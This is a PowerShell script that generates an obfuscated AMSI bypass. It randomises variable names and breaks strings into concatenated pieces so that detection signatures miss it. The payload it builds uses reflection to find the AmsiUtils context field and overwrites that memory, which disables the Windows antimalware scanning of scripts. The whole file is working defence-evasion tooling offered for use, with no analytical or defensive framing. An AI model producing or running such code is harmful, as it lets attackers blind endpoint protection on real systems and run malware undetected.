function Get-RandomVarName {
    param([int]$Length = 6)
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    $varName = '$' + -join ((1..$Length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    return $varName
}

function Mangle-String {
    param([string]$InputString)
    if ([string]::IsNullOrEmpty($InputString)) { return "''" }
    
    $chunks = @()
    $i = 0
    while ($i -lt $InputString.Length) {
        $chunkLen = Get-Random -Minimum 1 -Maximum 5 # Maximum is exclusive
        if (($i + $chunkLen) -gt $InputString.Length) {
            $chunkLen = $InputString.Length - $i
        }
        $chunks += "'$($InputString.Substring($i, $chunkLen))'"
        $i += $chunkLen
    }
    return $chunks -join '+'
}

function Generate-AmsiBypass {
    $refAssemblies = Get-RandomVarName
    $varType = Get-RandomVarName
    $varField = Get-RandomVarName
    $varContextField = Get-RandomVarName
    $varMemAddr = Get-RandomVarName
    $varPtr = Get-RandomVarName
    $varBuf = Get-RandomVarName

    $strIutils = Mangle-String "iUtils"
    $strContext = Mangle-String "Context"
    $strNonPublic = Mangle-String "NonPublic,Static"

    # Assemble the payload, carefully escaping $null and loop variables like $f
    $payload = "$refAssemblies = [Ref].Assembly.GetTypes(); " +
               "Foreach($varType in $refAssemblies) { " +
               "if ($($varType).Name -like '*'+$strIutils) { $varField = $varType } " +
               "}; " +
               "$varContextField = `$null; " +
               "Foreach(`$f in $($varField).GetFields($strNonPublic)) { " +
               "if (`$f.Name -like '*'+$strContext) { $varContextField = `$f } " +
               "}; " +
               "$varMemAddr = $($varContextField).GetValue(`$null); " +
               "[IntPtr]$varPtr = $varMemAddr; " +
               "[Int32[]]$varBuf = @(0); " +
               "[System.Runtime.InteropServices.Marshal]::Copy($varBuf, 0, $varPtr, 1)"

    return $payload
}

# Output the bypass
Generate-AmsiBypass
